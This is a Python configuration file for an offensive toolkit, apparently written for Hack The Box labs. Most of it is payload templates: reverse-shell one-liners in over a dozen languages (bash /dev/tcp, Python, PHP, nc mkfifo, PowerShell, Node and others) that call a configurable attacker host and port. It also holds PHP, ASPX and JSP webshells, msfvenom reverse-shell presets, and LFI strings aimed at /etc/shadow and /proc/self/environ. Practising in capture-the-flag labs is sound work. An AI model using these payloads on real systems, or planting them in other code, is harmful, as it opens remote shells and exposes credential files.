"""
HTB Tool — Global Configuration & Defaults
"""
import os
from pathlib import Path


# ── Directories ──────────────────────────────────────────────────────────────
PROJECTS_DIR = Path.home() / ".htb_projects"
CONFIG_FILE = Path.home() / ".htb_tool.yaml"

# ── Network ──────────────────────────────────────────────────────────────────
DEFAULT_VPN_INTERFACE = "tun0"
DEFAULT_LPORT = 4444
DEFAULT_THREADS = 50

# ── Wordlists ────────────────────────────────────────────────────────────────
WORDLISTS_DIR = Path("/usr/share/wordlists")
SECLISTS_DIR = Path("/usr/share/seclists")

DIR_WORDLIST = WORDLISTS_DIR / "dirb" / "common.txt"
DIR_WORDLIST_BIG = WORDLISTS_DIR / "dirb" / "big.txt"
DNS_WORDLIST = (
    SECLISTS_DIR / "Discovery" / "DNS" / "subdomains-top1million-5000.txt"
)
VHOST_WORDLIST = (
    SECLISTS_DIR / "Discovery" / "DNS" / "subdomains-top1million-5000.txt"
)
WEB_EXTENSIONS = "php,html,txt,bak,old,asp,aspx,jsp,cgi,xml,json,conf,log,zip"

# ── Scan Defaults ────────────────────────────────────────────────────────────
NMAP_DEFAULT_TIMING = "T4"
NMAP_TOP_PORTS = 1000
NMAP_UDP_TOP_PORTS = 100

# ── Payload Templates ────────────────────────────────────────────────────────
REVERSE_SHELL_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash-encoded": '/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
    "sh": "/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python": (
        'python -c \'import socket,subprocess,os;'
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        's.connect(("{lhost}",{lport}));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python3": (
        'python3 -c \'import socket,subprocess,os;'
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        's.connect(("{lhost}",{lport}));'
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "perl": (
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
        'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''),
    "ruby": (
        "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
        'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    ),
    "nc": "nc -e /bin/sh {lhost} {lport}",
    "nc-mkfifo": (
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
    ),
    "nc-c": "nc -c /bin/sh {lhost} {lport}",
    "socat": (
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
    ),
    "powershell": (
        "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ),
    "powershell-base64": "__SPECIAL_PS_B64__",  # handled programmatically
    "java": (
        'Runtime r = Runtime.getRuntime();'
        'Process p = r.exec(new String[]{{"/bin/bash","-c",'
        '"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"}});'
        'p.waitFor();'
    ),
    "groovy": (
        'String host="{lhost}";int port={lport};'
        'String cmd="/bin/bash";Process p=["bash","-c",'
        'cmd+" -i >& /dev/tcp/"+host+"/"+port+" 0>&1"].execute();'
    ),
    "lua": (
        "lua -e \"require('socket');require('os');"
        "t=socket.tcp();t:connect('{lhost}','{lport}');"
        "os.execute('/bin/sh -i <&3 >&3 2>&3');\""
    ),
    "node": (
        "(function(){{"
        "var net = require('net'),"
        "cp = require('child_process'),"
        "sh = cp.spawn('/bin/sh', []);"
        "var client = new net.Socket();"
        "client.connect({lport}, '{lhost}', function(){{"
        "client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});"
        "return /a/;}})();"
    ),
}

# ── Webshell Templates ───────────────────────────────────────────────────────
WEBSHELL_TEMPLATES = {
    "php": '<?php system($_GET["cmd"]); ?>',
    "php-passthru": '<?php passthru($_GET["cmd"]); ?>',
    "php-exec": '<?php echo exec($_GET["cmd"]); ?>',
    "php-shell-exec": '<?php echo shell_exec($_GET["cmd"]); ?>',
    "php-popen": '<?php $h=popen($_GET["cmd"],"r");echo fread($h,4096);pclose($h); ?>',
    "aspx": (
        '<%@ Page Language="C#" %>'
        '<%@ Import Namespace="System.Diagnostics" %>'
        '<%= Process.Start(new ProcessStartInfo("cmd","/c "+Request["cmd"])'
        '{UseShellExecute=false,RedirectStandardOutput=true}).StandardOutput.ReadToEnd() %>'
    ),
    "jsp": (
        '<%Runtime rt = Runtime.getRuntime();'
        'String[] cmd = {"/bin/sh","-c",request.getParameter("cmd")};'
        'Process p = rt.exec(cmd);'
        'java.io.InputStream is = p.getInputStream();'
        'int c;while((c=is.read())!=-1) out.print((char)c);%>'
    ),
}

# ── msfvenom Presets ─────────────────────────────────────────────────────────
MSFVENOM_PRESETS = {
    "linux-tcp": {
        "payload": "linux/x64/shell_reverse_tcp",
        "format": "elf",
        "extension": "elf",
    },
    "linux-meterpreter": {
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "format": "elf",
        "extension": "elf",
    },
    "windows-tcp": {
        "payload": "windows/x64/shell_reverse_tcp",
        "format": "exe",
        "extension": "exe",
    },
    "windows-meterpreter": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "exe",
        "extension": "exe",
    },
    "windows-staged": {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "format": "exe",
        "extension": "exe",
    },
    "php-tcp": {
        "payload": "php/reverse_php",
        "format": "raw",
        "extension": "php",
    },
    "php-meterpreter": {
        "payload": "php/meterpreter/reverse_tcp",
        "format": "raw",
        "extension": "php",
    },
    "python-tcp": {
        "payload": "cmd/unix/reverse_python",
        "format": "raw",
        "extension": "py",
    },
    "java-war": {
        "payload": "java/jsp_shell_reverse_tcp",
        "format": "war",
        "extension": "war",
    },
    "asp-tcp": {
        "payload": "windows/shell_reverse_tcp",
        "format": "asp",
        "extension": "asp",
    },
    "aspx-tcp": {
        "payload": "windows/x64/shell_reverse_tcp",
        "format": "aspx",
        "extension": "aspx",
    },
}

# ── LFI Payloads ─────────────────────────────────────────────────────────────
LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/auth.log",
    "/var/log/apache2/access.log",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

# ── Helpers ──────────────────────────────────────────────────────────────────


def get_tun0_ip() -> str | None:
    """Get IP address of tun0 (HTB VPN) interface."""
    import subprocess
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", DEFAULT_VPN_INTERFACE],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.split("\n"):
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return None


def ensure_projects_dir() -> Path:
    """Ensure the projects directory exists and return its path."""
    PROJECTS_DIR.mkdir(parents=True, exist_ok=True)
    return PROJECTS_DIR
